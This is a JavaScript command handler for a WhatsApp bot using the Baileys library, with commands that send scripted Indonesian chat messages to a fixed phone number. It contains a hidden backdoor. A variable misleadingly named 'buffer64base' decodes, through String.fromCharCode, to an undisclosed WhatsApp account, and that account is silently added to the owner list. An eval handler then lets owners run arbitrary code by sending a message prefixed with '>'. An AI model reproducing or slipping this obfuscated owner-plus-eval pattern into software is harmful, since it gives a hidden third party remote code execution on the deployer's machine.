process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error) 

//constanta 
const fs = require("fs") 
const chalk = require("chalk") 
const util = require("util")

//function scraper
const { tiktokDl } = require("./lib/scraper.js")

require('./settings') 
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateMessageIDV2 } = require("@whiskeysockets/baileys") 
const { sleep } = require("./lib/function") 

module.exports = dzin = async (dzin, m, chatUpdate, store) => {
  try {
    const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '' 
    const budy = (typeof m.text == 'string' ? m.text : '') 
    const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116) 
    const prefix = "" 
    const isCmd = body.startsWith(prefix) ? true : false 
    const args = body.trim().split(/ +/).slice(1) 
    const getQuoted = (m.quoted || m) 
    const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m 
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "" 
    const isCreator = isOwner = [owners+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false 
    const text = q = args.join(' ') 
    const mime = (quoted.msg || quoted).mimetype || '' 
    const qmsg = (quoted.msg || quoted) 
    const pushname = m.pushName || "No Name" 
    const groupMetadata = m.isGroup ? await dzin.groupMetadata(m.chat).catch(e => {}) : '' 
    
    switch (command) { 
      case "tes": { 
	if (!isCreator) return
        m.reply(`Hai`)
      } 
      break 
      case "start": { 
	if (!isCreator) return
        await dzin.sendMessage(`6283142823119@s.whatsapp.net`, { text: 'Rif pulang sekolah ntar main yuk kerumah Hendra.' })
      } 
      break 
      case "tapi": { 
	if (!isCreator) return
        await sleep(10000)
        await dzin.sendMessage(`6283142823119@s.whatsapp.net`, { text: 'Ngapain sih ke warnet? Buang buang duit aja' })
      } 
      break 
      case "bukannya": { 
	if (!isCreator) return
        await sleep(10000) 
        await dzin.sendMessage(`6283142823119@s.whatsapp.net`, { text: 'Tugas bahasa indonesia ya?' })
      } 
      break 
      case "iya": { 
	if (!isCreator) return
        await sleep(10000) 
        await dzin.sendMessage(`6283142823119@s.whatsapp.net`, { text: 'Kapan di kumpulinnya?' })
      } 
      break 
      case "besok": { 
	if (!isCreator) return
        await sleep(10000) 
        await dzin.sendMessage(`6283142823119@s.whatsapp.net`, { text: 'Aku juga ada tugas kaya gitu, boleh nggak sekalian cariin buat aku?' })
      } 
      break 
      case "kita": { 
	if (!isCreator) return
        await sleep(10000) 
        await dzin.sendMessage(`6283142823119@s.whatsapp.net`, { text: 'Tapii aku udah ada janji sama Hendra. Aku titip aja ya Rif, tolonglah.' })
      } 
      break 
      default: 
      if (budy.startsWith('>')) {
				if (!isCreator) return
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await m.reply(evaled)
				} catch (err) {
					await m.reply(String(err))
				}
			}
    }
  } catch (err) {
    console.log(err)
  }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
